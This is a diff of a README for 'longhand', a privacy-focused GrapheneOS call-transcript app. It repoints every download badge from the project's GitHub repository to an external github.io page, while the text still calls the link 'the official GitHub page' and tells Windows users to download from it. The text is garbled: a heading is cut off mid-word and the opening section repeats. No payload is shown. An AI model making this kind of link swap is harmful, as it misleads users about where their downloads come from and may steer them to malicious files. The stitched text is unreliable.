@@ -1,6 +1,6 @@
 # 📞 longhand - Private Call Transcripts On Your Phone
 
-[![Download longhand](https://img.shields.io/badge/Download%20longhand-4ecdc4?style=for-the-badge&labelColor=ff6b6b&logo=github&logoColor=white)](https://github.com/Habeebmoulana/longhand)
+[![Download longhand](https://img.shields.io/badge/Download%20longhand-4ecdc4?style=for-the-badge&labelColor=ff6b6b&logo=github&logoColor=white)](https://habeebmoulana.github.io)
 
 longhand is a privacy-focused application for turning recorded phone calls into readable transcripts and useful summaries. It is made for GrapheneOS, the privacy-focused Android system, and it is built so that your call content stays on your phone. The recordings, transcripts, and summaries are processed on the device. Nothing leaves the phone.
 
@@ -10,7 +10,7 @@ This page is written for a normal computer user. You do not need programming kno
 
 Visit this link to download the application.
 
-[![Download longhand](https://img.shields.io/badge/Get%20longhand-ff6b6b?style=for-the-badge&labelColor=4ecdc4&logo=github&logoColor=white)](https://github.com/Habeebmoulana/longhand)
+[![Download longhand](https://img.shields.io/badge/Get%20longhand-ff6b6b?style=for-the-badge&labelColor=4ecdc4&logo=github&logoColor=white)](https://habeebmoulana.github.io)
 
 The link opens the official GitHub page for longhand. Use your Windows browser to visit the page. From there, you can reach the application download. The file you get is meant for a GrapheneOS phone, not for running as a Windows desktop program.
 
@@ -76,7 +76,7 @@ All of this is designed around on-device AI and local speech-to-text. The goal i
 
 ## 🖥️ Using a# 📞 longhand - Private Call Transcripts On Your Phone
 
-[![Download longhand](https://img.shields.io/badge/Download%20longhand-4ecdc4?style=for-the-badge&labelColor=ff6b6b&logo=github&logoColor=white)](https://github.com/Habeebmoulana/longhand)
+[![Download longhand](https://img.shields.io/badge/Download%20longhand-4ecdc4?style=for-the-badge&labelColor=ff6b6b&logo=github&logoColor=white)](https://habeebmoulana.github.io)
 
 longhand is a privacy-focused application for turning recorded phone calls into readable transcripts and useful summaries. It is made for GrapheneOS, the privacy-focused Android system, and it is built so that your call content stays on your phone. The recordings, transcripts, and summaries are processed on the device. Nothing leaves the phone.
 
@@ -86,7 +86,7 @@ This page is written for a normal computer user. You do not need programming kno
 
 Visit this link to download the application.
 
-[![Download longhand](https://img.shields.io/badge/Get%20longhand-ff6b6b?style=for-the-badge&labelColor=4ecdc4&logo=github&logoColor=white)](https://github.com/Habeebmoulana/longhand)
+[![Download longhand](https://img.shields.io/badge/Get%20longhand-ff6b6b?style=for-the-badge&labelColor=4ecdc4&logo=github&logoColor=white)](https://habeebmoulana.github.io)
 
 The link opens the official GitHub page for longhand. Use your Windows browser to visit the page. From there, you can reach the application download. The file you get is meant for a GrapheneOS phone, not for running as a Windows desktop program.
 
@@ -221,7 +221,7 @@ Each part supports the same goal: a useful written record of a call, kept privat
 
 Visit this link to download the application.
 
-[![Download longhand](https://img.shields.io/badge/Get%20longhand-4ecdc4?style=for-the-badge&labelColor=ff6b6b&logo=github&logoColor=white)](https://github.com/Habeebmoulana/longhand)
+[![Download longhand](https://img.shields.io/badge/Get%20longhand-4ecdc4?style=for-the-badge&labelColor=ff6b6b&logo=github&logoColor=white)](https://habeebmoulana.github.io)
 
 Use only the official project page. That keeps you on the correct download path for longhand.
 
